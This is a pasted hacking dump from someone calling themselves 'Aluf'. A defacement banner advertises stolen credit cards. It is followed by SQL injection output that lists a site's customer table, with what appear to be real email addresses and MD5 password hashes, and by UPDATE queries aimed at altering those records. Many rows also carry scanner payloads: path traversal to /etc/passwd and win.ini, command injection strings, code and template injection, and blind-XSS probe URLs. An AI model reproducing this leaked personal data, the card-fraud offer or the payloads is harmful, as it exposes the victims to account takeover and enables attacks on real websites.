@@ -1,0 +1,198 @@
+#######################
+Website Hacked By Aluf#
+#######################
+
+########################################################################
+########################################################################
+####                     Posts  © Aluf                              ####
+####               http://D3F4ULTS.chatango.com                     ####
+####                                                                ####
+  _____  .__          _____                                         ####
+  /  _  \ |  |  __ ___/ ____\                                       ####
+ /  /_\  \|  | |  |  \   __\                                        ####
+/    |    \  |_|  |  /|  |                                          ####
+\____|__  /____/____/ |__|     © Aluf-[http://pastebin.com/u/Aluf]  ####
+        \/                                                          ####
+####   Message me anytime for any doubts .CC's i post might not     ####
+####   be working  everytime,so message me for fresh cc's  .        ####
+####   Website :   www.pastebing.tk                                 ####
+####   If you need suggestion for the pastebin bots of chatango     ####
+####   message me,lol i have run all the bots here myself,so        ####
+####   i guess ,i know which is the worst and best   .              ####
+####   Do not ask for my bot code on pm ,i quit years back .        ####
+####   If you have doubts regarding other codes on my pastebin      ####
+####   Still message me on   D3F4ULTS  or 93. [93 FOR COMPLAINS]    ####
+####   I Have been getting a lot of messages lately for cc's        ####
+####   and the worst part is many want to know to hack cc           ####
+####   I cannot help you with that ,you have to find a way yourself ####
+####   but ofc you can always ask for cc's but don't ask me how to  ####
+ ____  _     _     _____                                            ####
+/  _ \/ \   / \ /\/    /                                            ####
+| / \|| |   | | |||  __\                                            ####
+| |-||| |_/\| \_/|| |                                               ####
+\_/ \|\____/\____/\_/   ©   PMR [ Add me before messaging ]         ####
+########################################################################
+
+
+
+Query: UPDATE customers SET Id='' where Id=327 and email='semp@ak1.com' and Password='5416d7cd6ef195a0f7622a9c56b55e84'
+Query failed! (maybe its done?! check it yourself)
+Query: UPDATE customers SET Id='' where Id=323 and email=0 and Password='1f1767b5696e79116b11ecc7f2882783'
+Query failed! (maybe its done?! check it yourself)
+Query: UPDATE customers SET email='' where Id=329 and email='ddd@ddd.dd' and Password='1bbd886460827015e5d605ed44252251'
+Query failed! (maybe its done?! check it yourself)
+Count(*) of bluebell_database.customers is 153
+Data Found: Id,email,Password=34^aspiteri24@gmail.com^26a0b6b0d22aff43c8b35f794a259589
+Data Found: Id,email,Password=30^s_galea_@hotmail.com^579f11b746abc417a96c24d06ef8bfa5
+Data Found: Id,email,Password=33^galea.steph@gmail.com^88d4aa0a64fd2cb047eeda0c969897a2
+Data Found: Id,email,Password=35^dawnlunn247@gmail.com^d30158ef37cb8d0bb39ae1d1daddff95
+Data Found: Id,email,Password=36^sammie_hunt@hotmail.co.uk^d3c02eba821cc4a9c5c42dc1314b8435
+Data Found: Id,email,Password=37^suemicallef@gmail.com^5ad559aeb739bf6b8338a092b4be3deb
+Data Found: Id,email,Password=42^matheaa.cassar@facebook.com^7682fe272099ea26efe39c890b33675b
+Data Found: Id,email,Password=43^hanthea3@yahoo.com^9a1d67567137479da9f18c1d9902d0c7
+Data Found: Id,email,Password=46^steffiegalea@hotmail.com^774c7c65eee378886a5d661f587361a2
+Data Found: Id,email,Password=47^cutieboyz@gmail.com^de3ad996b0f9b480770602e7853af650
+Data Found: Id,email,Password=191^sample@email.tst^17eaf6b68c8958f59f76d9d12be10fad
+Data Found: Id,email,Password=192^response.write(9043091*9848949)^32cc5886dc1fa8c106a02056292c4654
+Data Found: Id,email,Password=193^"+response.write(9043091*9848949)+"^2520ee19fba6464005c7149325a1f04f
+Data Found: Id,email,Password=40^tborg72@hotmail.com^f06376ac3edb9937398d30781a417e73
+Data Found: Id,email,Password=39^liza_agius@hotmail.com^8103882aba940ae6fd46a42931606886
+Data Found: Id,email,Password=
+Data Found: Id,email,Password=
+Data Found: Id,email,Password=196^
+ SomeCustomInjectedHeader:injected_by_wvs^88638929a3a92298d7fe7e63343511d7
+Data Found: Id,email,Password=197^${99816+100184}^32cc5886dc1fa8c106a02056292c4654
+Data Found: Id,email,Password=199^"set|set&set"^d206824395fbd92dc622f857bf61a6e4
+Data Found: Id,email,Password=38^nadineboughrara@Gmail.com^da8051cc1fe070e336eff07e7193a65d
+Data Found: Id,email,Password=198^set|set&set^76ff47894556ebafad1c66ee2c3ecb3b
+Data Found: Id,email,Password=201^`set|set&set`^facaa1bc2bda15a89b92f950482c66fb
+Data Found: Id,email,Password=202^;set|set&set;^cb8d1cef60055d1f1e28f106ce559090
+Data Found: Id,email,Password=203^sample@email.tst&n957875=v990231^32cc5886dc1fa8c106a02056292c4654
+Data Found: Id,email,Password=204^http://some-inexistent-website.acu/some_inexistent_file_with_lon^32cc5886dc1fa8c106a02056292c4654
+Data Found: Id,email,Password=205^1some_inexistent_file_with_long_name%00.tst^02054ba92f09323a0a9187382f737004
+Data Found: Id,email,Password=206^268435455^7bd9e25dc3f9490bfc4c512ed60a981f
+Data Found: Id,email,Password=
+Data Found: Id,email,Password=207^http://testasp.vulnweb.com/t/fit.txt?%00.tst^169b49d72d5f86a71c3f479a1d32974d
+Data Found: Id,email,Password=209^testasp.vulnweb.com^bd24c80c856aca584e190264e2696757
+Data Found: Id,email,Password=
+Data Found: Id,email,Password=211^1e309^254cd5790f69f512b590a23c03bf46f7
+Data Found: Id,email,Password=212^Array^16e7ad769673d4b4cb5661abd1212957
+Data Found: Id,email,Password=213^)^b01878fdaf9656d19f19b30388745a3e
+Data Found: Id,email,Password=214^!(()&&!|*|*|^03f6c70e79429bfaef643c13e96563e9
+Data Found: Id,email,Password=215^^(#$!@#$)(()))******^89e8baba4f3548d9acbde7710db453d5
+Data Found: Id,email,Password=216^anim@hotamil.com^cf787ad3ebe79129ba3a149b6b287bf7
+Data Found: Id,email,Password=217^rizalnoe.dev@gmail.com^478994445ccbf5caa197de54014c3bf4
+Data Found: Id,email,Password=218^${99552+99789}^32cc5886dc1fa8c106a02056292c4654
+Data Found: Id,email,Password=219^sample@email.tst&n937047=v970155^32cc5886dc1fa8c106a02056292c4654
+Data Found: Id,email,Password=220^response.write(9829928*9444070)^32cc5886dc1fa8c106a02056292c4654
+Data Found: Id,email,Password=221^"+response.write(9829928*9444070)+"^32cc5886dc1fa8c106a02056292c4654
+Data Found: Id,email,Password=222^http://some-inexistent-website.acu/some_inexistent_file_with_lon^32cc5886dc1fa8c106a02056292c4654
+Data Found: Id,email,Password=223^1some_inexistent_file_with_long_name
+Data Found: Id,email,Password=41^dorianne1991@yahoo.com^2061e25349684e6721e402c67729eb94
+Data Found: Id,email,Password=
+Data Found: Id,email,Password=232^sample%40email.tst^4b6aaee87eb90ab8a81e07fbe8ec786a
+Data Found: Id,email,Password=233^Signup.php^32cc5886dc1fa8c106a02056292c4654
+Data Found: Id,email,Password=224^Http://testasp.vulnweb.com/t/fit.txt^32cc5886dc1fa8c106a02056292c4654
+Data Found: Id,email,Password=234^Signup.php
+Data Found: Id,email,Password=225^http://testasp.vulnweb.com/t/fit.txt?.tst^32cc5886dc1fa8c106a02056292c4654
+Data Found: Id,email,Password=228^";print(md5(acunetix_wvs_security_test));$a="^3c1ee2b59f256a96dc01da930e87e799
+Data Found: Id,email,Password=230^http://hitxeXz3jWHWH.bxss.me/^32cc5886dc1fa8c106a02056292c4654
+Data Found: Id,email,Password=227^;print(md5(acunetix_wvs_security_test));^8da44b5c076dd8680fe5e8fbfa85bc56
+Data Found: Id,email,Password=226^http://testasp.vulnweb.com/t/xss.html?%00.tst^e11b717df26799ca9cd4639ff0b9bb20
+Data Found: Id,email,Password=231^))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))^32cc5886dc1fa8c106a02056292c4654
+Data Found: Id,email,Password=235^www.acunetix.com^32cc5886dc1fa8c106a02056292c4654
+Data Found: Id,email,Password=236^<!--^9f7212213aad796fa859d8683a3c7d5b
+Data Found: Id,email,Password=237^Signup.php/.^32cc5886dc1fa8c106a02056292c4654
+Data Found: Id,email,Password=239^@@IQICb^32cc5886dc1fa8c106a02056292c4654
+Data Found: Id,email,Password=
+Data Found: Id,email,Password=240^JyI=^6865917f15c589930417c768d5c3e3fd
+Data Found: Id,email,Password=229^${@print(md5(acunetix_wvs_security_test))}^789a24c07658610b7adfa1f08d4a04a8
+Data Found: Id,email,Password=244^0^32cc5886dc1fa8c106a02056292c4654
+Data Found: Id,email,Password=245^0^32cc5886dc1fa8c106a02056292c4654
+Data Found: Id,email,Password=246^0^32cc5886dc1fa8c106a02056292c4654
+Data Found: Id,email,Password=250^0^32cc5886dc1fa8c106a02056292c4654
+Data Found: Id,email,Password=254^0^32cc5886dc1fa8c106a02056292c4654
+Data Found: Id,email,Password=243^N3Muxlbs^32cc5886dc1fa8c106a02056292c4654
+Data Found: Id,email,Password=247^0^32cc5886dc1fa8c106a02056292c4654
+Data Found: Id,email,Password=248^0^32cc5886dc1fa8c106a02056292c4654
+Data Found: Id,email,Password=
+Data Found: Id,email,Password=242^(select convert(int,CHAR(65)))^32cc5886dc1fa8c106a02056292c4654
+Data Found: Id,email,Password=249^0^32cc5886dc1fa8c106a02056292c4654
+Data Found: Id,email,Password=251^0^32cc5886dc1fa8c106a02056292c4654
+Data Found: Id,email,Password=252^sample%40email.tst_980663^32cc5886dc1fa8c106a02056292c4654
+Data Found: Id,email,Password=253^0^32cc5886dc1fa8c106a02056292c4654
+Data Found: Id,email,Password=255^sample%40email.tst" AND 2+1-1-1=0+0+0+1 AND "8C8e"="8C8e^32cc5886dc1fa8c106a02056292c4654
+Data Found: Id,email,Password=256^0^32cc5886dc1fa8c106a02056292c4654
+Data Found: Id,email,Password=257^0^32cc5886dc1fa8c106a02056292c4654
+Data Found: Id,email,Password=258^0^32cc5886dc1fa8c106a02056292c4654
+Data Found: Id,email,Password=259^0^32cc5886dc1fa8c106a02056292c4654
+Data Found: Id,email,Password=261^0^32cc5886dc1fa8c106a02056292c4654
+Data Found: Id,email,Password=265^0^32cc5886dc1fa8c106a02056292c4654
+Data Found: Id,email,Password=267^..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%0^32cc5886dc1fa8c106a02056292c4654
+Data Found: Id,email,Password=268^../../../../../../../../../../etc/passwd
+Data Found: Id,email,Password=266^../../../../../../../../../../etc/passwd^6aec562a0cb648972c2e39e5eb557d5d
+Data Found: Id,email,Password=272^.\./.\./.\./.\./.\./.\./etc/passwd^97a43d6430b2ef8228884b4b77aaaa3e
+Data Found: Id,email,Password=271^/../..//../..//../..//../..//../..//etc/passwd
+Data Found: Id,email,Password=273^/etc/passwd^472c50f3713038d1620a7ff1bd13b77d
+Data Found: Id,email,Password=274^../..//../..//../..//../..//../..//../..//../..//../..//etc/pass^32cc5886dc1fa8c106a02056292c4654
+Data Found: Id,email,Password=260^0^32cc5886dc1fa8c106a02056292c4654
+Data Found: Id,email,Password=269^Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAucG5n^8c34a10523e7473f7f8ee03d16601e87
+Data Found: Id,email,Password=264^0^32cc5886dc1fa8c106a02056292c4654
+Data Found: Id,email,Password=275^../.../.././../.../.././../.../.././../.../.././../.../.././../.^32cc5886dc1fa8c106a02056292c4654
+Data Found: Id,email,Password=
+Data Found: Id,email,Password=270^..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%0^32cc5886dc1fa8c106a02056292c4654
+Data Found: Id,email,Password=277^invalid../../../../../../../../../../etc/passwd/././././././././^32cc5886dc1fa8c106a02056292c4654
+Data Found: Id,email,Password=283^../../../../../../../../../../boot.ini^d0a44f7174b3cf56830077e91058a14e
+Data Found: Id,email,Password=282^../../../../../../../../../../windows/win.ini^bd3439a2822f0f2301fe5b9f54977208
+Data Found: Id,email,Password=278^file:///etc/passwd^0d61bb18b6f5620aa97ca3c755d0b517
+Data Found: Id,email,Password=279^/../../../../../../../etc/passwd^0edaa5c608aed08c4d886bf952694e0e
+Data Found: Id,email,Password=280^WEB-INF/web.xml^28a71d57a8d0fcae45b4ff7245949514
+Data Found: Id,email,Password=284^../../../../../../../../../../windows/win.ini
+Data Found: Id,email,Password=281^WEB-INFweb.xml^15e5a39cf485be83dd7e114562bb0380
+Data Found: Id,email,Password=
+Data Found: Id,email,Password=286^................windowswin.ini^36e25a8ac36e9464343c6bc645375f37
+Data Found: Id,email,Password=287^/.\./.\./.\./.\./.\./.\./windows/win.ini^6bee9e17e4dd40ca6c46bf6b45d85085
+Data Found: Id,email,Password=263^0^32cc5886dc1fa8c106a02056292c4654
+Data Found: Id,email,Password=288^../..//../..//../..//../..//../..//../..//../..//../..//windows/^32cc5886dc1fa8c106a02056292c4654
+Data Found: Id,email,Password=290^WEB-INF/web.xml?^32cc5886dc1fa8c106a02056292c4654
+Data Found: Id,email,Password=293^111-222-1933email@address.tst^2453821154035fcfef0c71215dad79c7
+Data Found: Id,email,Password=289^../.../.././../.../.././../.../.././../.../.././../.../.././../.^32cc5886dc1fa8c106a02056292c4654
+Data Found: Id,email,Password=291^WEB-INFweb.xml?^32cc5886dc1fa8c106a02056292c4654
+Data Found: Id,email,Password=295^acu3db7cc0322e7ecf84ee4342543ad26a8^25f896cb6f1a9559e086bdd492dde610
+Data Found: Id,email,Password=292^dfgh@ghjuk.nl^1bbd886460827015e5d605ed44252251
+Data Found: Id,email,Password=296^w3af@email.com^769ef37e10e26a488e4430e8743998f4
+Data Found: Id,email,Password=298^asdf@yahoo.com^1adbb3178591fd5bb0c248518f39bf6d
+Data Found: Id,email,Password=300^${99223+99979}^32cc5886dc1fa8c106a02056292c4654
+Data Found: Id,email,Password=299^rtyrtydgdfg@yahoo.com^b107e9a7ba2cd6d9e878c1a1c277554c
+Data Found: Id,email,Password=302^response.write(9637521*9650879)^32cc5886dc1fa8c106a02056292c4654
+Data Found: Id,email,Password=304^http://some-inexistent-website.acu/some_inexistent_file_with_lon^32cc5886dc1fa8c106a02056292c4654
+Data Found: Id,email,Password=305^http://hit3ub2PrA2lh.bxss.me/^32cc5886dc1fa8c106a02056292c4654
+Data Found: Id,email,Password=306^))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))^32cc5886dc1fa8c106a02056292c4654
+Data Found: Id,email,Password=307^http://www.acunetix.com^32cc5886dc1fa8c106a02056292c4654
+Data Found: Id,email,Password=308^//www.acunetix.com^32cc5886dc1fa8c106a02056292c4654
+Data Found: Id,email,Password=294^acufd0b106b37564b066fe3a464c1da5861^25f896cb6f1a9559e086bdd492dde610
+Data Found: Id,email,Password=297^lopaxt@gmail.com^91a5c6ed7c064630eeaade111dea9e50
+Data Found: Id,email,Password=262^0^32cc5886dc1fa8c106a02056292c4654
+Data Found: Id,email,Password=303^"+response.write(9637521*9650879)+"^32cc5886dc1fa8c106a02056292c4654
+Data Found: Id,email,Password=309^/www.acunetix.com^32cc5886dc1fa8c106a02056292c4654
+Data Found: Id,email,Password=310^sample%40email.tst_987192^32cc5886dc1fa8c106a02056292c4654
+Data Found: Id,email,Password=311^@@Mvd2V^32cc5886dc1fa8c106a02056292c4654
+Data Found: Id,email,Password=312^saddasa@yopmail.com^b190cec36352ced08c96150e4247cc95
+Data Found: Id,email,Password=313^<h1>black///////////////////////////</h1>^7fa7c150eb80b4e7ad58a5f1b290386b
+Data Found: Id,email,Password=315^kayleighborg1235@gmail.com^1eef609783c38c3993ed1805db4dddc8
+Data Found: Id,email,Password=317^@@sK2oW^1f1767b5696e79116b11ecc7f2882783
+Data Found: Id,email,Password=318^@@t6nXu^1f1767b5696e79116b11ecc7f2882783
+Data Found: Id,email,Password=321^0^1f1767b5696e79116b11ecc7f2882783
+Data Found: Id,email,Password=324^gillian085@hotmail.com^25d55ad283aa400af464c76d713c07ad
+Data Found: Id,email,Password=325^sammie_hunt@hotmail.co.uk	^9373b3bf77f5da488e4043b2858eb721
+Data Found: Id,email,Password=316^roozee05@gmail.com^835fb20ca4681d6b2de81a06c9eeb26e
+Data Found: Id,email,Password=314^Shellatmalta@hotmail.com^93b542f0c7a6f2279fc94f44b013baf1
+Data Found: Id,email,Password=319^S8sSjybh^1f1767b5696e79116b11ecc7f2882783
+Data Found: Id,email,Password=320^0^1f1767b5696e79116b11ecc7f2882783
+Data Found: Id,email,Password=322^0^1f1767b5696e79116b11ecc7f2882783
+Data Found: Id,email,Password=301^sample@email.tst&n905565=v938225^32cc5886dc1fa8c106a02056292c4654
+Data Found: Id,email,Password=326^knk@KJk.com^8ce87b8ec346ff4c80635f667d1592ae
+Data Found: Id,email,Password=327^semp@ak1.com^5416d7cd6ef195a0f7622a9c56b55e84
+Data Found: Id,email,Password=328^ebi.jadoogar@yahoo.com^25d55ad283aa400af464c76d713c07ad
+Data Found: Id,email,Password=329^ddd@ddd.dd^1bbd886460827015e5d605ed44252251
+Data Found: Id,email,Password=323^0^1f1767b5696e79116b11ecc7f2882783
